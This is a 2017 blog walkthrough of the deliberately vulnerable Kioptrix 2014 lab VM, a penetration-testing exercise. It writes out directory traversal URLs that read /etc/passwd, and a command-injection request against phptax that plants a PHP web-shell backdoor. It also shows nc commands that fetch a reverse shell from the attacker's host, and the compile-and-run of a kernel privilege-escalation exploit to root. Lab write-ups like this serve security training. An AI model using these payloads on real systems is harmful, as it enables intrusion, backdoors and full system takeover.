---
layout: post
title:  "Kioptrix: 2014 (#5)"
date:   2017-04-28
summary: Kioptrix 2014 (#5) walkthrough
---

### Setup
Download and unzip the vm, then mount the .vmdk file as storage in your vm config and setup your network settings. Note that this vm should auto detect using DHCP but it does have a warning that the network might need to be re-added.

Also note that when booting the vm it gets stuck at mountroot prompt, just enter `ufs:/dev/ada0p2` and it boots fine.

# Kioptrix: 2014 (#5)
To start we need to find the host on the network, to do this I used nmap to do a ping scan on the subnet:

{% highlight python %}
nmap -sn 192.168.56.0/24

Nmap scan report for 192.168.56.102
Host is up (-0.10s latency).
{% endhighlight %}

## Information gathering
Now we know the IP of the host we can use port scanning to see what services are running. With nmap we can also do some banner grabbing, version checking, OS detection and enumeration of services:

{% highlight python %}
nmap -sS -sV -O 192.168.56.102

PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
MAC Address: 08:00:27:70:BE:0E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: FreeBSD 9.X|10.X
OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10
OS details: FreeBSD 9.0-RELEASE - 10.3-RELEASE
Network Distance: 1 hop
{% endhighlight %}

Looks like its FreeBSB this time and only 3 interesting ports, ssh (22) and http (80/8080).

## Enumeration
The web app on port 80 just displays "It works!" and port 8080 returns the message "Forbidden You don't have permission to access / on this server." so something is hiding behind it.

However port 80's html source contains a meta tag:

{% highlight python %}
><!--
<META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
-->
{% endhighlight %}

Browsing to the page `/pChart2.1.3/examples/index.php` we get a chart web app. Searching online for pchart 2.1.3 we find it has a couple of vulnerabilities. The most useful being directory traversal, we can use this to read files on the OS eg /etc/passwd and /etc/shadow.

## Web app
[Details of the vulnerabilities](https://www.exploit-db.com/exploits/31173/) pchart 2.1.3 directory traversal to read arbitrary files, note that this will be done with whatever permissions the user running Apache has. 

{% highlight python %}
Read `/etc/passwd`
/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd

# $FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:29:38Z pjd $
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin
ossec:*:1001:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecm:*:1002:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecr:*:1003:1001:User &:/usr/local/ossec-hids:/sbin/nologin
{% endhighlight %}

/etc/shadow doesn't return anything so I'm assuming that the server is running under the www user and doesn't have permission.

However we can check the Apache config file to see what's hidden in the port 8080 config. From looking at the docs for Apache on freebsd it keeps its config in usr/local/etc/apache22/httpd.conf.

{% highlight python %}
/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf

DocumentRoot "/usr/local/www/apache22/data"

SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>
{% endhighlight %}

It looks like a different web app runs on port 8080, note its document root being different and only allowing access to browsers with the user agent Mozilla/4.0. Changing our user agent will return a new web app phptax :8080/phptax/.

{% highlight python %}
We can also read some of its code in:
usr/local/www/apache22/data2/phptax/index.php
usr/local/www/apache22/data2/phptax/drawimage.php

Note we can also read the code of pchart:
usr/local/www/apache22/data/index.html
usr/local/www/apache22/data/pChart2.1.3/examples/index.php
{% endhighlight %}

## phptax
The phptax web app looks like its used to generate pdfs from web forms, a quick search online shows it has a RCE vulnerability in drawimage.php. 
{% highlight c %}
if ($_GET[pdf] == "make") exec("convert ./data/pdf/$pfilef ./data/pdf/$pfilep");
{% endhighlight %}

This means we can execute OS commands as the www user.

{% highlight python %}
Execute `id > /tmp/test.txt`
:8080/phptax/drawimage.php?pfilez=xxx;%20id%20%3E%20/tmp/test.txt%20;&pdf=make
{% endhighlight %}

Now we can check if the file has been written by using the directory traversal vulnerability in pchart.
{% highlight python %}
/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2ftmp/test.txt

uid=80(www) gid=80(www) groups=80(www)
{% endhighlight %}

This confirms that we are the www user and that we can execute OS commands as well as write to /tmp.

We can now try and get shell access. I first tried using nc to listen then connect back but it never worked. Using `wget simple-backdoor.php &> /tmp/test.php` results in "wget: not found". So I tried echoing a simple php backdoor script to a file.

{% highlight python %}
echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > backdoor.php
http://192.168.56.102:8080/phptax/drawimage.php?pfilez=xxx;%20echo%20%22%3C?php%20echo%20shell_exec(\$_GET[%27cmd%27]);%20?%3E%22%20%3E%20backdoor.php%20;&pdf=make
{% endhighlight %}

Then using `backdoor.php?cmd=id` we can run commands much easier, however it would be better to have a remote shell. To do this we can use the web shell php-reverse-shell.php on Kali. Note we need to edit it to point to our listening nc service.

Start nc listening for connections on Kali
`nc -lvnp 1122`

Then upload the php-reverse-shell.php
{% highlight python %}
`nc ip port > reverse.php`
:8080/phptax/backdoor.php?cmd=nc%20192.168.56.101%201133%20%3E%20reverse.php
{% endhighlight %}

Now when we go to reverse.php it will connect back to our listening nc service and give us a remote shell.
{% highlight python %}
$ id
uid=80(www) gid=80(www) groups=80(www)
{% endhighlight %}

## Privilege escalation
Now we have a remote shell we need to escalate our privileges from the www user to root. When checking the kernel version and having a quick look online we see that there is an exploit available for 9.0 that should give us root.

{% highlight python %}
$ uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
{% endhighlight %}

[Intel SYSRET Kernel Privilege Escalation exploit](https://www.exploit-db.com/exploits/28718/), to execute the exploit it needs to be compiled on the system so we need to transfer the code over first.

{% highlight python %}
Set nc listening on Kali
nc -lvnp 1122 < exploit.c

Connect to it and redirect the output to a file
nc 192.168.56.101 1122 > exploit.c

Compile and change file permissions to run
gcc explit.c -o exploit
chmod 777 exploit

Run the exploit
$ ./exploit
[+] SYSRET FUCKUP!!
[+] Start Engine...
[+] Crotz...
[+] Crotz...
[+] Crotz...
[+] Woohoo!!!

$ id
uid=0(root) gid=0(wheel) groups=0(wheel)
{% endhighlight %}

Now we have root access to the server, gg.

## Conclusion
Server runs two web services, navigating to 8080 returns forbidden and port 80 returns "It worked", however on inspecting its html source we found a meta tag containing a link to pchart. This web app had a directory traversal vulnerability that allowed us to read the Apache config and see what was setup for 8080. The config only allowed access from user agents with mozilla/4.0, once we had changed ours to it the app contained a link to phptax. 

This web app then contained a RCE vulnerability in which we used to upload a simple php backdoor shell and then a reverse shell. When gathering more information we find the kernel as a vulnerability that will allows us to become root. Transferring over the exploit code, compiling it and running it gave us root. 